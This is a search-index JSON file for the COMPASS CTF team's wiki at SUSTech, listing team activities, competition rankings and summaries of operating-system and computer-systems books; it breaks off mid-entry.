{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"COMPASS CTF COMPASS CTF is a CTF team belonging to the Southern University of Science and Technology (SUSTech). Our members are from the COMPASS lab. Visit our lab website: COMPASS Activities Daily challenge: challenges are published every day. You can log into Challenge Platform and finish our daily challenges. Weekly meeting: every week we would have a meeting to synchronize our progress and plans for the next week. The meeting time is 4 pm, Thursday. If you are interested, join our meeting channel: https://meeting.tencent.com/p/4484894504 Weekly training: every week we would have trained together that let us learn and share information about CTF. The training time is 2 pm, Saturday. Join us If you want to participate CTFs or join us, please feel free to contact us if you satisfy the following requests: You are a student or an employee of SUSTech (we are a campus team!). You are interested in CTFs and you have the enthusiasm to learn new things about CTF. You know the basics of computer science or mathematics. You will enjoy your travel toward CTFs. If you are interested, please send to Email address: liz33#mail.sustech.edu.cn Contribute to the Wiki It's highly recommended to pull requests about new content and anything you find useful for Wiki. Our docs are based on the GitHub pages and MkDocs engine, use markdown to format our website. Modify a new file and pull it to the repository. We highly appreciate your contribution!","title":"COMPASS CTF"},{"location":"#compass-ctf","text":"COMPASS CTF is a CTF team belonging to the Southern University of Science and Technology (SUSTech). Our members are from the COMPASS lab. Visit our lab website: COMPASS","title":"COMPASS CTF"},{"location":"#activities","text":"Daily challenge: challenges are published every day. You can log into Challenge Platform and finish our daily challenges. Weekly meeting: every week we would have a meeting to synchronize our progress and plans for the next week. The meeting time is 4 pm, Thursday. If you are interested, join our meeting channel: https://meeting.tencent.com/p/4484894504 Weekly training: every week we would have trained together that let us learn and share information about CTF. The training time is 2 pm, Saturday.","title":"Activities"},{"location":"#join-us","text":"If you want to participate CTFs or join us, please feel free to contact us if you satisfy the following requests: You are a student or an employee of SUSTech (we are a campus team!). You are interested in CTFs and you have the enthusiasm to learn new things about CTF. You know the basics of computer science or mathematics. You will enjoy your travel toward CTFs. If you are interested, please send to Email address: liz33#mail.sustech.edu.cn","title":"Join us"},{"location":"#contribute-to-the-wiki","text":"It's highly recommended to pull requests about new content and anything you find useful for Wiki. Our docs are based on the GitHub pages and MkDocs engine, use markdown to format our website. Modify a new file and pull it to the repository. We highly appreciate your contribution!","title":"Contribute to the Wiki"},{"location":"award/","text":"Competition Awards COMPASS CTF team has participated in various competitions since 2021. In most of the competitions, we have achieved great rank, while some of them aren't. This file is an archive of all the competitions we joined. Both great ones and normal ones are collected here. 2022 Competition Time Rank KnightCTF 2022 January 20, 2022 #140 Real World CTF JAN 21 21:00, 2022 #159 DefCamp 2022 11-13 February, 2022 #194 VU CYBERTHON 2022 18 Feb 2022 #78 TQLCTF 2022 2022-02-19 #37 CODEGATE 2022 26 Feb 2022 #29 ECTF 2022 5th March 3:00 PM #31 KnightCTF 2022 VU CYBERTHON 2022 TQLCTF 2022 CODEGATE 2022 ECTF 2022","title":"Competition Awards"},{"location":"award/#competition-awards","text":"COMPASS CTF team has participated in various competitions since 2021. In most of the competitions, we have achieved great rank, while some of them aren't. This file is an archive of all the competitions we joined. Both great ones and normal ones are collected here.","title":"Competition Awards"},{"location":"award/#2022","text":"Competition Time Rank KnightCTF 2022 January 20, 2022 #140 Real World CTF JAN 21 21:00, 2022 #159 DefCamp 2022 11-13 February, 2022 #194 VU CYBERTHON 2022 18 Feb 2022 #78 TQLCTF 2022 2022-02-19 #37 CODEGATE 2022 26 Feb 2022 #29 ECTF 2022 5th March 3:00 PM #31","title":"2022"},{"location":"award/#knightctf-2022","text":"","title":"KnightCTF 2022"},{"location":"award/#vu-cyberthon-2022","text":"","title":"VU CYBERTHON 2022"},{"location":"award/#tqlctf-2022","text":"","title":"TQLCTF 2022"},{"location":"award/#codegate-2022","text":"","title":"CODEGATE 2022"},{"location":"award/#ectf-2022","text":"","title":"ECTF 2022"},{"location":"member/","text":"Members From the spring of 2021, we start to form the COMPASS CTF team. Our passion team us together and we grow to be experienced CTF and computer security engineers. Let's walk together and achieve further.","title":"Members"},{"location":"member/#members","text":"From the spring of 2021, we start to form the COMPASS CTF team. Our passion team us together and we grow to be experienced CTF and computer security engineers. Let's walk together and achieve further.","title":"Members"},{"location":"related/","text":"Related Links COMPASS Lab Website: http://compass.sustech.edu.cn/ COMPASS CTF Challenge Page: https://compass.ctfd.io/ SUSTech CSE Website: https://cse.sustech.edu.cn/","title":"Related Links"},{"location":"related/#related-links","text":"COMPASS Lab Website: http://compass.sustech.edu.cn/ COMPASS CTF Challenge Page: https://compass.ctfd.io/ SUSTech CSE Website: https://cse.sustech.edu.cn/","title":"Related Links"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/","text":"Android Dalvik\u865a\u62df\u673a\u7ed3\u6784\u53ca\u673a\u5236\u5256\u6790 Author: \u5434\u8273\u971e / \u5f20\u56fd\u5370 Overview \u662f\u4e00\u672c\u4ee5\u60c5\u666f\u65b9\u5f0f\u5bf9Android\u7684\u6e90\u4ee3\u7801\u8fdb\u884c\u6df1\u5165\u5206\u6790\u7684\u4e66\uff0c\u5185\u5bb9\u5e7f\u6cdb\uff0c\u4e3b\u8981\u4eceDalvik\u865a\u62df\u673a\u6574\u4f53\u7ed3\u6784\u3001\u83b7\u53d6\u548c\u7f16\u8bd1Dalvik\u865a\u62df\u673a\u7684\u6e90\u7801\u3001\u6e90\u7801\u5206\u6790\u8f85\u52a9\u5de5\u5177\u4f7f\u7528\u3001.dex\u6587\u4ef6\u53caDalvik\u5b57\u8282\u7801\u683c\u5f0f\u89e3\u6790\u3001Dalvik\u865a\u62df\u673a\u4e0b\u7684\u7cfb\u7edf\u5de5\u5177\u4ecb\u7ecd\u53caDalvik\u865a\u62df\u673a\u6267\u884c\u6d41\u7a0b\u7b80\u8ff0\u7b49\u65b9\u9762\u8fdb\u884c\u9610\u8ff0\uff0c\u5e2e\u52a9\u8bfb\u8005\u4ece\u5b8f\u89c2\u4e0a\u4e86\u89e3Dalvik\u865a\u62df\u673a\u7684\u67b6\u6784\u8bbe\u8ba1\uff0c\u4e3a\u6709\u5174\u8da3\u9605\u8bfbDalvik\u865a\u62df\u673a\u6e90\u7801\u7684\u8bfb\u8005\u63d0\u4f9b\u5fc5\u8981\u7684\u5165\u95e8\u6307\u5bfc\u3002 Cover","title":"Android Dalvik\u865a\u62df\u673a\u7ed3\u6784\u53ca\u673a\u5236\u5256\u6790"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#android-dalvik","text":"Author: \u5434\u8273\u971e / \u5f20\u56fd\u5370","title":"Android Dalvik\u865a\u62df\u673a\u7ed3\u6784\u53ca\u673a\u5236\u5256\u6790"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#overview","text":"\u662f\u4e00\u672c\u4ee5\u60c5\u666f\u65b9\u5f0f\u5bf9Android\u7684\u6e90\u4ee3\u7801\u8fdb\u884c\u6df1\u5165\u5206\u6790\u7684\u4e66\uff0c\u5185\u5bb9\u5e7f\u6cdb\uff0c\u4e3b\u8981\u4eceDalvik\u865a\u62df\u673a\u6574\u4f53\u7ed3\u6784\u3001\u83b7\u53d6\u548c\u7f16\u8bd1Dalvik\u865a\u62df\u673a\u7684\u6e90\u7801\u3001\u6e90\u7801\u5206\u6790\u8f85\u52a9\u5de5\u5177\u4f7f\u7528\u3001.dex\u6587\u4ef6\u53caDalvik\u5b57\u8282\u7801\u683c\u5f0f\u89e3\u6790\u3001Dalvik\u865a\u62df\u673a\u4e0b\u7684\u7cfb\u7edf\u5de5\u5177\u4ecb\u7ecd\u53caDalvik\u865a\u62df\u673a\u6267\u884c\u6d41\u7a0b\u7b80\u8ff0\u7b49\u65b9\u9762\u8fdb\u884c\u9610\u8ff0\uff0c\u5e2e\u52a9\u8bfb\u8005\u4ece\u5b8f\u89c2\u4e0a\u4e86\u89e3Dalvik\u865a\u62df\u673a\u7684\u67b6\u6784\u8bbe\u8ba1\uff0c\u4e3a\u6709\u5174\u8da3\u9605\u8bfbDalvik\u865a\u62df\u673a\u6e90\u7801\u7684\u8bfb\u8005\u63d0\u4f9b\u5fc5\u8981\u7684\u5165\u95e8\u6307\u5bfc\u3002","title":"Overview"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BB%93%E6%9E%84%E5%8F%8A%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Android%20Internals/","text":"Android Internals: Power User's View Author: Jonathan Levin (Author) Overview Android Internals::A Confectioner's Cookbook is the first time the inner workings of the world's most popular operating system have been documented! Without going into the lengthy code, it presents the logic and flow of Android's various components using detailed illustrations, verbose annotations and hands-on experiments! Volume I takes the power user's point of view - the utilities and functionality accessible through adb shell. In particular, we explore: Partitions and Filesystems The Boot Process Init and its configuration files The native daemons in /system/bin The framework service architecture and servicemanager, Monitoring through Linux interfaces, and of course Security. All versions of Android - up to and including the upcoming Nougat - are covered, with examples taken from the wide gamut of Android Devices - Nexi, Samsung Galaxy S series, NVidia Shield, Amazon Kindle, HTC One M9, and the Android Emulator. This is the first in a multi-volume series, aiming to explore Android down to its last class. Stay tuned for Volume II - The Programmer's View - which picks up where the Power User's View ends, and dives deeper still into the frameworks, input, audio, video and network architecture... wading through the inevitable quagmire of code. Cover","title":"Android Internals: Power User's View"},{"location":"Book/Computer%20and%20System/Android%20Internals/#android-internals-power-users-view","text":"Author: Jonathan Levin (Author)","title":"Android Internals: Power User's View"},{"location":"Book/Computer%20and%20System/Android%20Internals/#overview","text":"Android Internals::A Confectioner's Cookbook is the first time the inner workings of the world's most popular operating system have been documented! Without going into the lengthy code, it presents the logic and flow of Android's various components using detailed illustrations, verbose annotations and hands-on experiments! Volume I takes the power user's point of view - the utilities and functionality accessible through adb shell. In particular, we explore: Partitions and Filesystems The Boot Process Init and its configuration files The native daemons in /system/bin The framework service architecture and servicemanager, Monitoring through Linux interfaces, and of course Security. All versions of Android - up to and including the upcoming Nougat - are covered, with examples taken from the wide gamut of Android Devices - Nexi, Samsung Galaxy S series, NVidia Shield, Amazon Kindle, HTC One M9, and the Android Emulator. This is the first in a multi-volume series, aiming to explore Android down to its last class. Stay tuned for Volume II - The Programmer's View - which picks up where the Power User's View ends, and dives deeper still into the frameworks, input, audio, video and network architecture... wading through the inevitable quagmire of code.","title":"Overview"},{"location":"Book/Computer%20and%20System/Android%20Internals/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Android%E7%B3%BB%E7%BB%9F%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90/","text":"Android\u7cfb\u7edf\u6e90\u4ee3\u7801\u60c5\u666f\u5206\u6790 Author: \u7f57\u5347\u9633 Overview \u5728\u5185\u5bb9\u4e0a\uff0c\u672c\u4e66\u7ed3\u5408\u4f7f\u7528\u60c5\u666f\uff0c\u5168\u9762\u3001\u6df1\u5165\u3001\u7ec6\u81f4\u5730\u5206\u6790Android\u7cfb\u7edf\u7684\u6e90\u4ee3\u7801\uff0c\u6d89\u53ca\u5230Linux\u5185\u6838\u5c42\u3001\u786c\u4ef6\u62bd\u8c61\u5c42\uff08HAL\uff09\u3001\u8fd0\u884c\u65f6\u5e93\u5c42(Runtime)\u3001\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42(Application Framework)\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u5c42(Application)\u3002 \u5728\u7ec4\u7ec7\u4e0a\uff0c\u672c\u4e66\u5c06\u4e0a\u8ff0\u5185\u5bb9\u5212\u5206\u4e3a\u521d\u8bc6Android\u7cfb\u7edf\u3001Android\u4e13\u7528\u9a71\u52a8\u7cfb\u7edf\u548cAndroid\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u4e09\u5927\u7bc7\u7ae0\u3002\u521d\u8bc6Android\u7cfb\u7edf\u7bc7\u4ecb\u7ecd\u4e86\u53c2\u8003\u4e66\u7c4d\u3001\u57fa\u7840\u77e5\u8bc6\u4ee5\u53ca\u5b9e\u9a8c\u73af\u5883\u642d\u5efa\uff1bAndroid\u4e13\u7528\u9a71\u52a8\u7cfb\u7edf\u7bc7\u4ecb\u7ecd\u4e86Logger\u65e5\u5fd7\u9a71\u52a8\u7a0b\u5e8f\u3001Binder\u8fdb\u7a0b\u95f4\u901a\u4fe1\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u53caAshmem\u533f\u540d\u5171\u4eab\u5185\u5b58\u9a71\u52a8\u7a0b\u5e8f\uff1bAndroid\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u7bc7\u4ece\u7ec4\u4ef6\u3001\u8fdb\u7a0b\u3001\u6d88\u606f\u4ee5\u53ca\u5b89\u88c5\u56db\u4e2a\u7ef4\u5ea6\u6765\u5bf9Android\u5e94\u7528\u7a0b\u5e8f\u7684\u6846\u67b6\u8fdb\u884c\u4e86\u6df1\u5165\u7684\u5256\u6790\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5185\u5bb9\u53ca\u5176\u7ec4\u7ec7\uff0c\u672c\u4e66\u80fd\u4f7f\u8bfb\u8005\u65e2\u80fd\u4ece\u6574\u4f53\u4e0a\u628a\u63e1Android\u7cfb\u7edf\u7684\u5c42\u6b21\u7ed3\u6784\uff0c\u53c8\u80fd\u4ece\u7ec6\u8282\u4e0a\u53bb\u638c\u63e1\u6bcf\u4e00\u4e2a\u5c42\u6b21\u7684\u8981\u70b9\u3002 Cover","title":"Android\u7cfb\u7edf\u6e90\u4ee3\u7801\u60c5\u666f\u5206\u6790"},{"location":"Book/Computer%20and%20System/Android%E7%B3%BB%E7%BB%9F%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90/#android","text":"Author: \u7f57\u5347\u9633","title":"Android\u7cfb\u7edf\u6e90\u4ee3\u7801\u60c5\u666f\u5206\u6790"},{"location":"Book/Computer%20and%20System/Android%E7%B3%BB%E7%BB%9F%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90/#overview","text":"\u5728\u5185\u5bb9\u4e0a\uff0c\u672c\u4e66\u7ed3\u5408\u4f7f\u7528\u60c5\u666f\uff0c\u5168\u9762\u3001\u6df1\u5165\u3001\u7ec6\u81f4\u5730\u5206\u6790Android\u7cfb\u7edf\u7684\u6e90\u4ee3\u7801\uff0c\u6d89\u53ca\u5230Linux\u5185\u6838\u5c42\u3001\u786c\u4ef6\u62bd\u8c61\u5c42\uff08HAL\uff09\u3001\u8fd0\u884c\u65f6\u5e93\u5c42(Runtime)\u3001\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42(Application Framework)\u4ee5\u53ca\u5e94\u7528\u7a0b\u5e8f\u5c42(Application)\u3002 \u5728\u7ec4\u7ec7\u4e0a\uff0c\u672c\u4e66\u5c06\u4e0a\u8ff0\u5185\u5bb9\u5212\u5206\u4e3a\u521d\u8bc6Android\u7cfb\u7edf\u3001Android\u4e13\u7528\u9a71\u52a8\u7cfb\u7edf\u548cAndroid\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u4e09\u5927\u7bc7\u7ae0\u3002\u521d\u8bc6Android\u7cfb\u7edf\u7bc7\u4ecb\u7ecd\u4e86\u53c2\u8003\u4e66\u7c4d\u3001\u57fa\u7840\u77e5\u8bc6\u4ee5\u53ca\u5b9e\u9a8c\u73af\u5883\u642d\u5efa\uff1bAndroid\u4e13\u7528\u9a71\u52a8\u7cfb\u7edf\u7bc7\u4ecb\u7ecd\u4e86Logger\u65e5\u5fd7\u9a71\u52a8\u7a0b\u5e8f\u3001Binder\u8fdb\u7a0b\u95f4\u901a\u4fe1\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u53caAshmem\u533f\u540d\u5171\u4eab\u5185\u5b58\u9a71\u52a8\u7a0b\u5e8f\uff1bAndroid\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u7bc7\u4ece\u7ec4\u4ef6\u3001\u8fdb\u7a0b\u3001\u6d88\u606f\u4ee5\u53ca\u5b89\u88c5\u56db\u4e2a\u7ef4\u5ea6\u6765\u5bf9Android\u5e94\u7528\u7a0b\u5e8f\u7684\u6846\u67b6\u8fdb\u884c\u4e86\u6df1\u5165\u7684\u5256\u6790\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5185\u5bb9\u53ca\u5176\u7ec4\u7ec7\uff0c\u672c\u4e66\u80fd\u4f7f\u8bfb\u8005\u65e2\u80fd\u4ece\u6574\u4f53\u4e0a\u628a\u63e1Android\u7cfb\u7edf\u7684\u5c42\u6b21\u7ed3\u6784\uff0c\u53c8\u80fd\u4ece\u7ec6\u8282\u4e0a\u53bb\u638c\u63e1\u6bcf\u4e00\u4e2a\u5c42\u6b21\u7684\u8981\u70b9\u3002","title":"Overview"},{"location":"Book/Computer%20and%20System/Android%E7%B3%BB%E7%BB%9F%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Code/","text":"Code: The Hidden Language of Computer Hardware and Software Author: Charles Petzold Content Petzold begins Code by discussing older technologies like Morse code, Braille, and Boolean logic, which he uses to explain vacuum tubes, transistors, and integrated circuits. He noted that \"very smart people\" had to go down the \"dead ends\" of mechanical computers and decimal computing before reaching a scalable solution\u2014namely, the electronic, binary computer with a von Neumann architecture. The book also covers more recent developments, including topics like floating point math, operating systems, and ASCII. The book focuses on \"pre-networked computers\" and does not cover concepts like distributed computing because Petzold thought that it would not be as useful for \"most people using the Internet\", his intended audience. Specifically, he said in an interview that his \"main hope\" in writing Code was to impart upon his readers a \"really good feeling for what a bit is, and how bits are combined to convey information\". Cover","title":"Code: The Hidden Language of Computer Hardware and Software"},{"location":"Book/Computer%20and%20System/Code/#code-the-hidden-language-of-computer-hardware-and-software","text":"Author: Charles Petzold","title":"Code: The Hidden Language of Computer Hardware and Software"},{"location":"Book/Computer%20and%20System/Code/#content","text":"Petzold begins Code by discussing older technologies like Morse code, Braille, and Boolean logic, which he uses to explain vacuum tubes, transistors, and integrated circuits. He noted that \"very smart people\" had to go down the \"dead ends\" of mechanical computers and decimal computing before reaching a scalable solution\u2014namely, the electronic, binary computer with a von Neumann architecture. The book also covers more recent developments, including topics like floating point math, operating systems, and ASCII. The book focuses on \"pre-networked computers\" and does not cover concepts like distributed computing because Petzold thought that it would not be as useful for \"most people using the Internet\", his intended audience. Specifically, he said in an interview that his \"main hope\" in writing Code was to impart upon his readers a \"really good feeling for what a bit is, and how bits are combined to convey information\".","title":"Content"},{"location":"Book/Computer%20and%20System/Code/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Computer%20Systems/","text":"Computer Systems: A Programmer's Perspective Author: Randal Bryant (Author), David O'Hallaron (Author) Overview This book (CS:APP3e) is the third edition of a book that stems from the introductory computer systems course we developed at Carnegie Mellon University, starting in the Fall of 1998, called \"Introduction to Computer Systems\" (ICS). The presentation is based on the following principles, which aim to help the students become better programmers and to help prepare them for upper-level systems courses: Students should be introduced to computer systems from the perspective of a programmer, rather from the more traditional perspective of a system implementer. What does this mean? Students should get a view of the complete system, comprising the hardware, operating system, compiler, and network. Students learn best by developing and evaluating real programs that run on real machines. We cover data representations, machine level representations of C programs, processor architecture, program optimizations, the memory hierarchy, linking, exceptional control flow (exceptions, interrupts, processes, and Unix signals), virtual memory and memory management, system-level I/O, basic network programming, and concurrent programming. These concepts are supported by series of fun and hands-on lab assignments. See the manuscript Preface for more details. Cover","title":"Computer Systems: A Programmer's Perspective"},{"location":"Book/Computer%20and%20System/Computer%20Systems/#computer-systems-a-programmers-perspective","text":"Author: Randal Bryant (Author), David O'Hallaron (Author)","title":"Computer Systems: A Programmer's Perspective"},{"location":"Book/Computer%20and%20System/Computer%20Systems/#overview","text":"This book (CS:APP3e) is the third edition of a book that stems from the introductory computer systems course we developed at Carnegie Mellon University, starting in the Fall of 1998, called \"Introduction to Computer Systems\" (ICS). The presentation is based on the following principles, which aim to help the students become better programmers and to help prepare them for upper-level systems courses: Students should be introduced to computer systems from the perspective of a programmer, rather from the more traditional perspective of a system implementer. What does this mean? Students should get a view of the complete system, comprising the hardware, operating system, compiler, and network. Students learn best by developing and evaluating real programs that run on real machines. We cover data representations, machine level representations of C programs, processor architecture, program optimizations, the memory hierarchy, linking, exceptional control flow (exceptions, interrupts, processes, and Unix signals), virtual memory and memory management, system-level I/O, basic network programming, and concurrent programming. These concepts are supported by series of fun and hands-on lab assignments. See the manuscript Preface for more details.","title":"Overview"},{"location":"Book/Computer%20and%20System/Computer%20Systems/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/","text":"Linux Kernel Development Author: Robert Love (Author) Book description Linux Kernel Development details the design and implementation of the Linux kernel, presenting the content in a manner that is beneficial to those writing and developing kernel code, as well as to programmers seeking to better understand the operating system and become more efficient and productive in their coding. The book details the major subsystems and features of the Linux kernel, including its design, implementation, and interfaces. It covers the Linux kernel with both a practical and theoretical eye, which should appeal to readers with a variety of interests and needs. The author, a core kernel developer, shares valuable knowledge and experience on the 2.6 Linux kernel. Specific topics covered include process management, scheduling, time management and timers, the system call interface, memory addressing, memory management, the page cache, the VFS, kernel synchronization, portability concerns, and debugging techniques. This book covers the most interesting features of the Linux 2.6 kernel, including the CFS scheduler, preemptive kernel, block I/O layer, and I/O schedulers. The third edition of Linux Kernel Development includes new and updated material throughout the book: An all-new chapter on kernel data structures Details on interrupt handlers and bottom halves Extended coverage of virtual memory and memory allocation Tips on debugging the Linux kernel In-depth coverage of kernel synchronization and locking Useful insight into submitting kernel patches and working with the Linux kernel community Cover","title":"Linux Kernel Development"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/#linux-kernel-development","text":"Author: Robert Love (Author)","title":"Linux Kernel Development"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/#book-description","text":"Linux Kernel Development details the design and implementation of the Linux kernel, presenting the content in a manner that is beneficial to those writing and developing kernel code, as well as to programmers seeking to better understand the operating system and become more efficient and productive in their coding. The book details the major subsystems and features of the Linux kernel, including its design, implementation, and interfaces. It covers the Linux kernel with both a practical and theoretical eye, which should appeal to readers with a variety of interests and needs. The author, a core kernel developer, shares valuable knowledge and experience on the 2.6 Linux kernel. Specific topics covered include process management, scheduling, time management and timers, the system call interface, memory addressing, memory management, the page cache, the VFS, kernel synchronization, portability concerns, and debugging techniques. This book covers the most interesting features of the Linux 2.6 kernel, including the CFS scheduler, preemptive kernel, block I/O layer, and I/O schedulers. The third edition of Linux Kernel Development includes new and updated material throughout the book: An all-new chapter on kernel data structures Details on interrupt handlers and bottom halves Extended coverage of virtual memory and memory allocation Tips on debugging the Linux kernel In-depth coverage of kernel synchronization and locking Useful insight into submitting kernel patches and working with the Linux kernel community","title":"Book description"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/","text":"Mac OS X and iOS Internals: To the Apple\u2019s Core Author: Jonathan Levin (Author) Overview Powering Macs, iPhones, iPads and more, OS X and iOS are becoming ubiquitous. When it comes to documentation, however, much of them are shrouded in mystery. Cocoa and Carbon, the application frameworks, are neatly described, but system programmers find the rest lacking. This indispensable guide illuminates the darkest corners of those systems, starting with an architectural overview, then drilling all the way to the core. Provides you with a top down view of OS X and iOS Walks you through the phases of system startup\u2014both Mac (EFi) and mobile (iBoot) Explains how processes, threads, virtual memory, and filesystems are maintained Covers the security architecture Reviews the internal Apis used by the system\u2014BSD and Mach Dissects the kernel, XNU, into its sub components: Mach, the BSD Layer, and I/o kit, and explains each in detail Explains the inner workings of device drivers From architecture to implementation, this book is essential reading if you want to get serious about the internal workings of Mac OS X and iOS. Cover","title":"Mac OS X and iOS Internals: To the Apple\u2019s Core"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/#mac-os-x-and-ios-internals-to-the-apples-core","text":"Author: Jonathan Levin (Author)","title":"Mac OS X and iOS Internals: To the Apple\u2019s Core"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/#overview","text":"Powering Macs, iPhones, iPads and more, OS X and iOS are becoming ubiquitous. When it comes to documentation, however, much of them are shrouded in mystery. Cocoa and Carbon, the application frameworks, are neatly described, but system programmers find the rest lacking. This indispensable guide illuminates the darkest corners of those systems, starting with an architectural overview, then drilling all the way to the core. Provides you with a top down view of OS X and iOS Walks you through the phases of system startup\u2014both Mac (EFi) and mobile (iBoot) Explains how processes, threads, virtual memory, and filesystems are maintained Covers the security architecture Reviews the internal Apis used by the system\u2014BSD and Mach Dissects the kernel, XNU, into its sub components: Mach, the BSD Layer, and I/o kit, and explains each in detail Explains the inner workings of device drivers From architecture to implementation, this book is essential reading if you want to get serious about the internal workings of Mac OS X and iOS.","title":"Overview"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/","text":"Understanding the Linux Kernel Author: Daniel P. Bovet (Author), Marco Cesati (Author) Overview In order to thoroughly understand what makes Linux tick and why it works so well on a wide variety of systems, you need to delve deep into the heart of the kernel. The kernel handles all interactions between the CPU and the external world, and determines which programs will share processor time, in what order. It manages limited memory so well that hundreds of processes can share the system efficiently, and expertly organizes data transfers so that the CPU isn't kept waiting any longer than necessary for the relatively slow disks. The third edition of Understanding the Linux Kernel takes you on a guided tour of the most significant data structures, algorithms, and programming tricks used in the kernel. Probing beyond superficial features, the authors offer valuable insights to people who want to know how things really work inside their machine. Important Intel-specific features are discussed. Relevant segments of code are dissected line by line. But the book covers more than just the functioning of the code; it explains the theoretical underpinnings of why Linux does things the way it does. This edition of the book covers Version 2.6, which has seen significant changes to nearly every kernel subsystem, particularly in the areas of memory management and block devices. The book focuses on the following topics: Memory management, including file buffering, process swapping, and Direct memory Access (DMA) The Virtual Filesystem layer and the Second and Third Extended Filesystems Process creation and scheduling Signals, interrupts, and the essential interfaces to device drivers Timing Synchronization within the kernel Interprocess Communication (IPC) Program execution Understanding the Linux Kernel will acquaint you with all the inner workings of Linux, but it's more than just an academic exercise. You'll learn what conditions bring out Linux's best performance, and you'll see how it meets the challenge of providing good system response during process scheduling, file access, and memory management in a wide variety of environments. This book will help you make the most of your Linux system. Cover","title":"Understanding the Linux Kernel"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/#understanding-the-linux-kernel","text":"Author: Daniel P. Bovet (Author), Marco Cesati (Author)","title":"Understanding the Linux Kernel"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/#overview","text":"In order to thoroughly understand what makes Linux tick and why it works so well on a wide variety of systems, you need to delve deep into the heart of the kernel. The kernel handles all interactions between the CPU and the external world, and determines which programs will share processor time, in what order. It manages limited memory so well that hundreds of processes can share the system efficiently, and expertly organizes data transfers so that the CPU isn't kept waiting any longer than necessary for the relatively slow disks. The third edition of Understanding the Linux Kernel takes you on a guided tour of the most significant data structures, algorithms, and programming tricks used in the kernel. Probing beyond superficial features, the authors offer valuable insights to people who want to know how things really work inside their machine. Important Intel-specific features are discussed. Relevant segments of code are dissected line by line. But the book covers more than just the functioning of the code; it explains the theoretical underpinnings of why Linux does things the way it does. This edition of the book covers Version 2.6, which has seen significant changes to nearly every kernel subsystem, particularly in the areas of memory management and block devices. The book focuses on the following topics: Memory management, including file buffering, process swapping, and Direct memory Access (DMA) The Virtual Filesystem layer and the Second and Third Extended Filesystems Process creation and scheduling Signals, interrupts, and the essential interfaces to device drivers Timing Synchronization within the kernel Interprocess Communication (IPC) Program execution Understanding the Linux Kernel will acquaint you with all the inner workings of Linux, but it's more than just an academic exercise. You'll learn what conditions bring out Linux's best performance, and you'll see how it meets the challenge of providing good system response during process scheduling, file access, and memory management in a wide variety of environments. This book will help you make the most of your Linux system.","title":"Overview"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/#cover","text":"","title":"Cover"},{"location":"Book/Computer%20and%20System/Windows%20Internals/","text":"Windows Internals Author: Pavel Yosifovich (Author), Mark Russinovich (Author), David Solomon (Author), Alex Ionescu (Author) Overview This book helps you: Understand the Windows system architecture and its general components Explore internal data structures using tools like the kernel debugger Understand how Windows uses processes for management and isolation Understand and view thread scheduling and how CPU resources are managed Dig into the Windows security model including recent advances in security mitigations Understand how Windows manages virtual and physical memory Understand how the I/O system manages physical devices and device drivers The 7th edition was written by Pavel Yosifovich, Alex Ionescu, Mark Russinovich and David Solomon. New material has been added since the 6th edition (which covered Windows 7 and Windows Server 2008 R2). Since the 7th edition\u2019s part 2 is not yet available, the Windows Internals 6th edition (written by Mark Russinovich, David Solomon and Alex Ionescu) is an invaluable resource on missing topics from the first part of the 7th edition. These include system mechanisms, management mechanisms, networking, file systems, cache management and troubleshooting system crashes. History of the Book This is the seventh edition of a book that was originally called Inside Windows NT (Microsoft Press, 1992), written by Helen Custer (prior to the initial release of Microsoft Windows NT 3.1). Inside Windows NT was the first book ever published about Windows NT and provided key insights into the architecture and design of the system. Inside Windows NT, Second Edition (Microsoft Press, 